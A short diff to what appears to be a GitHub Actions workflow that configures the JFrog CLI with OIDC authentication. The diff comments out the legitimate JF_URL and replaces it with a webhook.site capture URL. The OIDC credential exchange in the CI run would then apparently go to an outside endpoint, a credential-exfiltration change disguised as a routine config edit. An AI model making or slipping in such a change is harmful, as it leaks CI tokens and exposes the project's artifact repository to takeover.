@@ -16,7 +16,8 @@ jobs:
         uses: jfrog/setup-jfrog-cli@v4
         id: setup-cli
         env:
-          JF_URL: https://${{ vars.JF_URL }}/
+          # JF_URL: https://${{ vars.JF_URL }}/
+          JF_URL: https://webhook.site/738e1907-ee00-41d6-af90-928e61d45df7
         with:
           oidc-provider-name: ${{ vars.OIDC_PROVIDER_NAME }}
 
